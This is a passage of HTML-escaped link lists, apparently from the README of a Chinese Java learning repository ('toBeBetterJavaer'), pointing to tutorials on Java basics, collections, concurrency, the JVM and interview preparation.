href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/xuexiluxian/python.md&#34;&gt;Python学习路线（建议收藏&lt;span&gt;👍&lt;/span&gt;）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/xuexiluxian/go.md&#34;&gt;Go语言学习路线（建议收藏&lt;span&gt;👍&lt;/span&gt;）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/xuexiluxian/os.md&#34;&gt;操作系统学习路线（建议收藏&lt;span&gt;👍&lt;/span&gt;）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/xuexiluxian/qianduan.md&#34;&gt;前端学习路线（建议收藏&lt;span&gt;👍&lt;/span&gt;）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/xuexiluxian/lanqiaobei.md&#34;&gt;蓝桥杯学习路线（建议收藏&lt;span&gt;👍&lt;/span&gt;）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/xuexiluxian/algorithm.md&#34;&gt;算法和数据结构学习路线（建议收藏&lt;span&gt;👍&lt;/span&gt;）&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;面渣逆袭&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE] &lt;strong&gt;面试前必读系列&lt;/strong&gt;！包括 Java 基础、Java 集合框架、Java 并发编程、Java 虚拟机、Spring、Redis 等等。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/sidebar/sanfene/javase.md&#34;&gt;面渣逆袭（Java 基础篇）必看&lt;span&gt;👍&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/sidebar/sanfene/collection.md&#34;&gt;面渣逆袭（Java 集合框架篇）必看&lt;span&gt;👍&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/sidebar/sanfene/javathread.md&#34;&gt;面渣逆袭（Java 并发编程篇）必看&lt;span&gt;👍&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/sidebar/sanfene/jvm.md&#34;&gt;面渣逆袭（Java 虚拟机篇）必看&lt;span&gt;👍&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/sidebar/sanfene/spring.md&#34;&gt;面渣逆袭（Spring）必看&lt;span&gt;👍&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/sidebar/sanfene/redis.md&#34;&gt;面渣逆袭（Redis）必看&lt;span&gt;👍&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;学习建议&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE] &lt;strong&gt;收集了我所有的知乎高赞帖子&lt;/strong&gt;！全方位迷茫解惑。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/xuexijianyi/read-csapp.md&#34;&gt;如何阅读《深入理解计算机系统》这本书？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/xuexijianyi/electron-information-engineering.md&#34;&gt;电子信息工程最好的出路的是什么？&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Java核心&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE] &lt;strong&gt;Java核心非常重要&lt;/strong&gt;！我将其分成了Java 基础篇（包括基础语法、面向对象、集合框架、异常处理、Java IO 等）、Java 并发篇和 Java 虚拟机篇。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Java概述&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/overview/what-is-java.md&#34;&gt;什么是Java？Java发展简史，Java的优势&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/overview/hello-world.md&#34;&gt;第一个Java程序：Hello World&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Java基础语法&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-grammar/basic-data-type.md&#34;&gt;Java支持的8种基本数据类型&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-grammar/flow-control.md&#34;&gt;Java流程控制语句&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-grammar/operator.md&#34;&gt;Java运算符&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-grammar/javadoc.md&#34;&gt;Java注释：单行、多行和文档注释&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/48-keywords.md&#34;&gt;Java中常用的48个关键字&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/java-naming.md&#34;&gt;Java命名规范（非常全面，可以收藏）&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Java面向对象编程&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/oo/object-class.md&#34;&gt;怎么理解Java中类和对象的概念？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/oo/var.md&#34;&gt;Java变量的作用域：局部变量、成员变量、静态变量、常量&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/oo/method.md&#34;&gt;Java方法&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/oo/construct.md&#34;&gt;Java构造方法&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/nice-article/bokeyuan-jianxijavazhongdifangwenquanxiankongzhi.md&#34;&gt;浅析Java中的访问权限控制&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/oo/code-init.md&#34;&gt;Java代码初始化块&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/oo/abstract.md&#34;&gt;Java抽象类&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/oo/interface.md&#34;&gt;Java接口&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/oo/static.md&#34;&gt;Java中的static关键字解析&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/oo/this-super.md&#34;&gt;Java中this和super的用法总结&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/oo/final.md&#34;&gt;浅析Java中的final关键字&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/oo/instanceof.md&#34;&gt;Java instanceof关键字用法&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/immutable.md&#34;&gt;深入理解Java中的不可变对象&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/varables.md&#34;&gt;Java中可变参数的使用&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/generic.md&#34;&gt;深入理解Java泛型&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/annotation.md&#34;&gt;深入理解Java注解&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/enum.md&#34;&gt;Java枚举（enum）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/fanshe.md&#34;&gt;大白话说Java反射：入门、使用、原理&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;字符串&amp;amp;数组&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/string/immutable.md&#34;&gt;为什么String是不可变的？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/string/constant-pool.md&#34;&gt;深入了解Java字符串常量池&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/string/intern.md&#34;&gt;深入解析 String#intern&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/string/equals.md&#34;&gt;Java判断两个字符串是否相等？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/string/join.md&#34;&gt;Java字符串拼接的几种方式&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/string/split.md&#34;&gt;如何在Java中优雅地分割String字符串？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/array/array.md&#34;&gt;深入理解Java数组&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/array/print.md&#34;&gt;如何优雅地打印Java数组？&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;集合框架（容器）&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/collection/gailan.md&#34;&gt;Java集合框架&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/collection/arraylist.md&#34;&gt;Java集合ArrayList详解&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/collection/linkedlist.md&#34;&gt;Java集合LinkedList详解&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/collection/list-war-2.md&#34;&gt;Java中ArrayList和LinkedList的区别&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/collection/iterator-iterable.md&#34;&gt;Java中的Iterator和Iterable区别&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/collection/fail-fast.md&#34;&gt;为什么阿里巴巴强制不要在foreach里执行删除操作&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/collection/hashmap.md&#34;&gt;Java8系列之重新认识HashMap&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Java输入输出&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/io/shangtou.md&#34;&gt;Java IO学习整理&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/io/BIONIOAIO.md&#34;&gt;如何给女朋友解释什么是 BIO、NIO 和 AIO？&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;异常处理&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/exception/gailan.md&#34;&gt;一文读懂Java异常处理&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/exception/try-with-resouces.md&#34;&gt;详解Java7新增的try-with-resouces语法&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/exception/shijian.md&#34;&gt;Java异常处理的20个最佳实践&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/exception/npe.md&#34;&gt;Java空指针NullPointerException的传说&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;常用工具类&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/common-tool/arrays.md&#34;&gt;Java Arrays工具类10大常用方法&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/common-tool/collections.md&#34;&gt;Java集合框架：Collections工具类&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/common-tool/hutool.md&#34;&gt;Hutool：国产良心工具包，让你的Java变得更甜&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/common-tool/guava.md&#34;&gt;Google开源的Guava工具库，太强大了～&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Java新特性&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/java8/stream.md&#34;&gt;Java 8 Stream流详细用法&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/java8/optional.md&#34;&gt;Java 8 Optional最佳指南&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/java8/Lambda.md&#34;&gt;深入浅出Java 8 Lambda表达式&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Java重要知识点&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/java-unicode.md&#34;&gt;彻底弄懂Java中的Unicode和UTF-8编码&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/int-cache.md&#34;&gt;Java中int、Integer、new Integer之间的区别&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/box.md&#34;&gt;深入剖析Java中的拆箱和装箱&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/deep-copy.md&#34;&gt;彻底讲明白的Java浅拷贝与深拷贝&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/hashcode.md&#34;&gt;深入理解Java中的hashCode方法&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/equals-hashcode.md&#34;&gt;一次性搞清楚equals和hashCode&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/override-overload.md&#34;&gt;Java重写(Override)与重载(Overload)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/Overriding.md&#34;&gt;Java重写（Overriding）时应当遵守的11条规则&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/pass-by-value.md&#34;&gt;Java到底是值传递还是引用传递？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/true-generic.md&#34;&gt;Java不能实现真正泛型的原因是什么？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/comparable-omparator.md&#34;&gt;详解Java中Comparable和Comparator的区别&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/jdk9-char-byte-string.md&#34;&gt;jdk9为何要将String的底层实现由char[]改成了byte[]?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/jdk-while-for-wuxian-xunhuan.md&#34;&gt;为什么JDK源码中，无限循环大多使用for(;;)而不是while(true)?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/class-object.md&#34;&gt;先有Class还是先有Object？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/basic-extra-meal/instanceof-jvm.md&#34;&gt;instanceof关键字是如何实现的？&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Java并发编程&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/wangzhe-thread.md&#34;&gt;室友打了一把王者就学会了创建Java线程的3种方式&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/thread-state-and-method.md&#34;&gt;Java线程的6种状态及切换(透彻讲解)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/thread-group-and-thread-priority.md&#34;&gt;线程组是什么？线程优先级如何设置？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/why-need-thread.md&#34;&gt;进程与线程的区别是什么？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/thread-bring-some-problem.md&#34;&gt;并发编程带来了哪些问题？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/jmm.md&#34;&gt;全面理解Java的内存模型（JMM）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/volatile.md&#34;&gt;Java并发编程volatile关键字解析&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/synchronized.md&#34;&gt;Java中的synchronized关键字锁的到底是什么？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/cas.md&#34;&gt;Java实现CAS的原理&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/aqs.md&#34;&gt;Java并发AQS详解&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/lock.md&#34;&gt;大致了解下Java的锁接口和锁&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/reentrantLock.md&#34;&gt;深入理解Java并发重入锁ReentrantLock&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/ReentrantReadWriteLock.md&#34;&gt;深入理解Java并发读写锁ReentrantReadWriteLock&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/condition.md&#34;&gt;深入理解Java并发线程协作类Condition&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/LockSupport.md&#34;&gt;深入理解Java并发线程线程阻塞唤醒类LockSupport&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/map.md&#34;&gt;简单聊聊Java的并发集合容器&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/ConcurrentHashMap.md&#34;&gt;吊打Java并发面试官之ConcurrentHashMap&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/ConcurrentLinkedQueue.md&#34;&gt;吊打Java并发面试官之ConcurrentLinkedQueue&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/CopyOnWriteArrayList.md&#34;&gt;吊打Java并发面试官之CopyOnWriteArrayList&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/ThreadLocal.md&#34;&gt;吊打Java并发面试官之ThreadLocal&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/BlockingQueue.md&#34;&gt;吊打Java并发面试官之BlockingQueue&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/pool.md&#34;&gt;面试必备：Java线程池解析&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/ali-executors.md&#34;&gt;为什么阿里巴巴要禁用Executors创建线程池？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/ScheduledThreadPoolExecutor.md&#34;&gt;深入剖析Java计划任务ScheduledThreadPoolExecutor&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/atomic.md&#34;&gt;Java atomic包中的原子操作类总结&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/CountDownLatch.md&#34;&gt;Java并发编程通信工具类CountDownLatch等一网打尽&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/fork-join.md&#34;&gt;深入理解Java并发编程之Fork/Join框架&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/thread/shengchanzhe-xiaofeizhe.md&#34;&gt;从根上理解生产者-消费者模式&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Java虚拟机&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/what-is-jvm.md&#34;&gt;JVM到底是什么？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/how-run-java-code.md&#34;&gt;JVM到底是如何运行Java代码的？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/class-load.md&#34;&gt;我竟然不再抗拒Java的类加载机制了&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/class-file-jiegou.md&#34;&gt;详解Java的类文件（class文件）结构&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/bytecode.md&#34;&gt;从javap的角度轻松看懂字节码&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a 